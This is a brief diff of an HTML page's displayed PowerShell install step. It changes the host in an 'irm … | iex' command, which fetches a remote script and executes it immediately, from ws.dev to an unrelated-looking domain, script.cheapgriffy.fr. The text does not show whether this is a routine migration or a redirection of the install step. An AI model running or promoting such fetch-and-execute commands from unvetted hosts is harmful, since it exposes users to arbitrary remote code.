@@ -20,7 +20,7 @@
           </div>
           <div class="code-body">
             <span class="code-prompt">PS&gt;</span>
-            <span class="code-cmd">irm https://ws.dev/script/<span class="code-highlight">Jk3xZ2</span></span>
+            <span class="code-cmd">irm https://script.cheapgriffy.fr/script/<span class="code-highlight">Jk3xZ2</span></span>
             <span class="code-op"> | iex</span>
           </div>
         </div>
